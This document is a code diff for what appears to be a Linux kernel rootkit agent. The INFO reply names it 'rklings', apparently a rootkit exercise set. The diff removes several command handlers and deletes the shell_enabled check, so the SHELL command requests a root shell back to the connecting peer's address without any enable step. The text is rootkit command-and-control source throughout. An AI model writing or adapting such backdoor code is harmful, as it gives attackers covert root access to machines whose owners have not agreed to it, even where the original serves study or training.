@@ -47,9 +47,6 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 				      sizeof(error_reply) - 1);
 
 	switch (command.kind) {
-	case RK_COMMAND_PING:
-		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"PONG", 4);
 	case RK_COMMAND_INFO:
 		return rk_agent_reply(agent, socket,
 				      (const unsigned char *)"INFO rklings", 12);
@@ -58,33 +55,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 					 "STATUS connected=%s",
 					 agent->connected ? "true" : "false");
 		return rk_agent_reply(agent, socket, reply, reply_length);
-	case RK_COMMAND_MARK:
-		reply_length = scnprintf(reply, sizeof(reply), "MARKED %s",
-					 command.mark);
-		return rk_agent_reply(agent, socket, reply, reply_length);
-	case RK_COMMAND_ENABLE:
-		mutex_lock(&agent->lock);
-		agent->shell_enabled = true;
-		mutex_unlock(&agent->lock);
-		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"ENABLED", 7);
-	case RK_COMMAND_DISABLE:
-		mutex_lock(&agent->lock);
-		agent->shell_enabled = false;
-		mutex_unlock(&agent->lock);
-		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"DISABLED", 8);
-	case RK_COMMAND_RUN:
-		return rk_agent_reply(agent, socket,
-				      (const unsigned char *)"QUEUED", 6);
 	case RK_COMMAND_SHELL:
-		mutex_lock(&agent->lock);
-		if (!agent->shell_enabled) {
-			mutex_unlock(&agent->lock);
-			return rk_agent_reply(agent, socket,
-					      (const unsigned char *)"ERR disabled", 12);
-		}
-		mutex_unlock(&agent->lock);
 		error = rk_root_shell_request(
 			agent->shell, agent->peer.sin_addr.s_addr,
 			command.shell_port, &ticket);
